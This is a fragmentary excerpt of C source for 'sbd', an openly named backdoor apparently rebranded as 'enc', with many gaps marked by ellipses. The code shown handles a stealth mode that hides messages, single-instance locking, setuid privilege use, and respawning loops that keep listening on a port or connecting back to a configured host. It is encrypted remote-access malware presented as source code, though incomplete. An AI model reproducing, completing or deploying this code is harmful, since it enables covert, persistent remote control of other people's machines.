 ...
 * sbd - shadowinteger's backdoor - $Revision: 1.36 $
 ...
 ******************************************************************************
 *
 * This program's AES-CBC-128 + HMAC-SHA1 implementation is 
 * Copyright (C) Christophe Devine <devine@cr0.net> and is 
...
"$Id: enc.c,v 1.0.0.1 2015/06/10 06:55:00 martel Exp $";
#endif


/* edit enc.h to hardcode listen/connect behaviour into enc */
#include "enc.h"
...
/******** global variables ********/
    ...
    #define HIGHLIGHT_PREFIX "\x1b[0;32m" //==Green==
#endif
...
char separator_between_prefix_and_data[] = SEPARATOR_BETWEEN_PREFIX_AND_DATA;
    ...
    char enc_semaphore[] = INSTANCE_SEMAPHORE;
    HANDLE enc_semhandle;
#endif
...
/* socket_code.h contain enc_listen() and enc_connect() */
#include "socket_code.h"


#ifdef WIN32
void enc_release_semaphore(void) {
    ReleaseSemaphore(enc_semhandle, 1, NULL);
    CloseHandle(enc_semhandle);
}
#endif
...
/* back to win32 _and_ unix options */
    ...
    if (only_one_instance) {
        enc_semhandle = CreateSemaphore(NULL, 1, 1, enc_semaphore);
        if (WaitForSingleObject(enc_semhandle, 0) == WAIT_TIMEOUT) {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "enc is already running, use -1off to override!\n");
            #else
                #ifndef STEALTH
                if (!quiet)
                    infobox("enc is already running, use -1off to override!");
                #endif
            #endif
            CloseHandle(enc_semhandle);
            return 1;
        }
        atexit(enc_release_semaphore);
    }
    ...
    /* if the setuid and/or setgid bit is set on enc, set effective uid and/or gid */
    ...
    if (do_listen) {
        ...
        if (respawn_enabled) {
            while (1) {
                if (enc_listen(port, bind_to_address) == 1) {
                    return 1;
                }
                #ifndef WINMAIN
            ...
            enc_listen(port, bind_to_address);
        }
        ...
        if (respawn_enabled) {
            ...
            while (1) {
                if (enc_connect(host, port, sport, bind_to_address) == 1) {
                    return 1;
                }
                #ifndef WINMAIN
                    if (verbose && (respawn_interval > 1)) {
            ...
            enc_connect(host, port, sport, bind_to_address);
        }
    }
